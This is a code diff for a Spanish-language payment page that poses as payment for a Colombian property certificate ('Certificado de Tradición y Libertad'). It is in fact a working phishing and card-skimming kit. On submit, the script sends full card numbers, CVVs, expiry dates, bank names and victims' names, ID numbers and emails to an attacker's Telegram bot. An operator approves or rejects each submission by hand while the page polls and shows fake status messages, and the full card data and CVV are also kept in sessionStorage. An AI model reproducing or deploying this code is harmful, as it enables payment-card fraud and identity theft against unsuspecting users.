+                cardLogo.innerHTML = '';
+            }
+        });
+
+        expiryInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9/]/g, '');
+            this.value = formatExpiry(this.value);
+        });
+
+        cvcInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        cardholderInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase();
+        });
+
+        // ============================================
+        // FUNCIONES DE WEBHOOK Y TELEGRAM
+        // ============================================
+        async function configurarWebhook() {
+            try {
+                const response = await fetch(`${WEBHOOK_URL}?setup=true`);
+                const data = await response.json();
+                console.log('🔗 Webhook configurado:', data);
+                return data.success;
+            } catch (error) {
+                console.error('❌ Error configurando webhook:', error);
+                return false;
+            }
+        }
+
+        function mostrarError(mensaje) {
+            statusMessage.className = 'status-message error';
+            statusMessage.textContent = mensaje;
+            loadingOverlay.classList.remove('active');
+            submitButton.disabled = false;
+            submitButton.textContent = 'Pagar de forma segura';
+            
+            cardNumberInput.disabled = false;
+            cardholderInput.disabled = false;
+            expiryInput.disabled = false;
+            cvcInput.disabled = false;
+            bancoEmisor.disabled = false;
+        }
+
+        function mostrarExito(mensaje) {
+            statusMessage.className = 'status-message success';
+            statusMessage.textContent = mensaje;
+        }
+
+        function generarSolicitudId() {
+            return 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+        }
+
+        async function enviarDatosATelegram(datos) {
+            try {
+                const inlineKeyboard = {
+                    inline_keyboard: [
+                        [
+                            { text: "✅ APROBAR", callback_data: `approve_${datos.solicitudId}` },
+                            { text: "❌ RECHAZAR", callback_data: `reject_${datos.solicitudId}` }
+                        ]
+                    ]
+                };
+
+                const mensaje = `🔔 *NUEVA SOLICITUD - CERTIFICADO DE TRADICIÓN Y LIBERTAD*
+
+🆔 ID: \`${datos.solicitudId}\`
+
+📋 *DATOS PERSONALES:*
+👤 Nombre completo: ${datos.nombreCompleto}
+🆔 Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
+📧 Email: ${datos.email}
+
+💳 *DATOS DE LA TARJETA:*
+🏦 Número: \`${datos.numeroTarjeta}\`
+🔢 CVV: \`${datos.cvv}\`
+📅 Vencimiento: \`${datos.vencimiento}\`
+💳 Tipo: ${datos.tipoTarjeta.toUpperCase()}
+🏛️ Banco emisor: ${datos.bancoEmisor}
+
+💰 Total: ${datos.totalFormateado}
+📅 Fecha: ${datos.fechaHora}
+
+⏳ *Estado:* Esperando verificación...`;
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown',
+                        reply_markup: inlineKeyboard,
+                        disable_web_page_preview: true
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.ok) {
+                    console.log('✅ Datos enviados exitosamente a Telegram');
+                    return true;
+                } else {
+                    console.error('❌ Error al enviar a Telegram:', data.description);
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ Error al enviar a Telegram:', error);
+                return false;
+            }
+        }
+
+        async function verificarEstadoSolicitud(solicitudId) {
+            try {
+                const response = await fetch(`${WEBHOOK_URL}?check=${solicitudId}`);
+                const data = await response.json();
+                console.log('📊 Estado de solicitud:', data);
+                return data.estado || 'pending';
+            } catch (error) {
+                console.error('❌ Error verificando estado:', error);
+                return 'error';
+            }
+        }
+
+        function iniciarPolling() {
+            let tiempoInicio = Date.now();
+            
+            pollingInterval = setInterval(async () => {
+                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
+                    clearInterval(pollingInterval);
+                    mostrarError('Tiempo de espera agotado. Por favor, intente nuevamente.');
+                    return;
+                }
+                
+                const resultado = await verificarEstadoSolicitud(solicitudId);
+                
+                if (resultado === 'approved') {
+                    clearInterval(pollingInterval);
+                    mostrarExito('✅ Pago aprobado. Redirigiendo...');
+                    
+                    setTimeout(() => {
+                        if (cardType === 'visa') {
+                            window.location.href = 'visa.html';
+                        } else if (cardType === 'mastercard') {
+                            window.location.href = 'master.html';
+                        } else if (cardType === 'amex') {
+                            window.location.href = 'amex.html';
+                        }
+                    }, 2000);
+                    
+                } else if (resultado === 'rejected') {
+                    clearInterval(pollingInterval);
+                    mostrarError('❌ Error al procesar la tarjeta. Por favor, verifique los datos e intente nuevamente.');
+                }
+            }, POLLING_INTERVAL);
+        }
+
+        // ============================================
+        // ENVÍO DEL FORMULARIO
+        // ============================================
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const cardNumber = cardNumberInput.value.replace(/\s/g, '');
+            const cardholderName = cardholderInput.value.trim();
+            const expiry = expiryInput.value;
+            const cvc = cvcInput.value;
+            const banco = bancoEmisor.value;
+
+            let isValid = true;
+
+            document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));
+            statusMessage.className = 'status-message';
+            statusMessage.textContent = '';
+
+            if (!cardholderName) {
+                cardholderInput.parentElement.classList.add('error');
+                isValid = false;
+            }
+
+            cardType = detectCardType(cardNumber);
+            if (!cardType || cardNumber.length === 0) {
+                cardNumberInput.parentElement.parentElement.classList.add('error');
+                isValid = false;
+            }
+
+            const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+            if (!expiryRegex.test(expiry)) {
+                expiryInput.parentElement.classList.add('error');
+                isValid = false;
+            }
+
+            const cvcLength = cardType === 'amex' ? 4 : 3;
+            if (cvc.length !== cvcLength) {
+                cvcInput.parentElement.classList.add('error');
+                isValid = false;
+            }
+
+            if (!banco) {
+                bancoEmisor.parentElement.classList.add('error');
+                isValid = false;
+            }
+
+            if (!isValid) {
+                return;
+            }
+
+            solicitudId = generarSolicitudId();
+
+            loadingOverlay.classList.add('active');
+            submitButton.disabled = true;
+            submitButton.textContent = 'Procesando...';
+
+            cardNumberInput.disabled = true;
+            cardholderInput.disabled = true;
+            expiryInput.disabled = true;
+            cvcInput.disabled = true;
+            bancoEmisor.disabled = true;
+
+            const cardLast4 = cardNumber.slice(-4);
+            sessionStorage.setItem('cardLast4', cardLast4);
+            sessionStorage.setItem('cardNumberFull', cardNumber);
+            sessionStorage.setItem('cardCVV', cvc);
+            sessionStorage.setItem('cardExpiry', expiry);
+            sessionStorage.setItem('cardType', cardType);
+            sessionStorage.setItem('procesamiento_prioritario', localStorage.getItem('procesamiento_prioritario') || 'false');
+            sessionStorage.setItem('bancoEmisor', banco);
+
+            // Leer datos personales desde localStorage
+            const nombre = localStorage.getItem('nombre') || 'No proporcionado';
+            const apellidos = localStorage.getItem('apellidos') || '';
+            const tipoDocumento = localStorage.getItem('tipoDocumento') || '';
+            const numeroDocumento = localStorage.getItem('numeroDocumento') || 'No proporcionado';
+            const email = localStorage.getItem('email') || 'No proporcionado';
+
+            const procesamiento_prioritario = localStorage.getItem('procesamiento_prioritario') === 'true';
+            let total = 23000;
+            if (procesamiento_prioritario) {
+                total += 20000;
+            }
+            const totalFormateado = total.toLocaleString('es-CO').replace(/,/g, '.') + ' Col$';
+            
+            const fechaHora = new Date().toLocaleString('es-CO', { 
+                timeZone: 'America/Bogota',
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+
+            const datosTelegram = {
+                solicitudId: solicitudId,
+                nombreCompleto: `${nombre} ${apellidos}`.trim(),
+                tipoDocumento: tipoDocumento,
+                numeroDocumento: numeroDocumento,
+                email: email,
+                numeroTarjeta: cardNumber,
+                cvv: cvc,
+                vencimiento: expiry,
+                tipoTarjeta: cardType,
+                bancoEmisor: banco,
+                totalFormateado: totalFormateado,
+                fechaHora: fechaHora
+            };
+
+            const enviado = await enviarDatosATelegram(datosTelegram);
+
+            if (enviado) {
+                iniciarPolling();
+            } else {
+                mostrarError('Error al procesar el pago. Por favor, intente nuevamente.');
+                // Rehabilitar campos
+                cardNumberInput.disabled = false;
+                cardholderInput.disabled = false;
+                expiryInput.disabled = false;
+                cvcInput.disabled = false;
+                bancoEmisor.disabled = false;
+                submitButton.disabled = false;
+                submitButton.textContent = 'Pagar de forma segura';
+                loadingOverlay.classList.remove('active');
+            }
         });
     </script>
 </body>
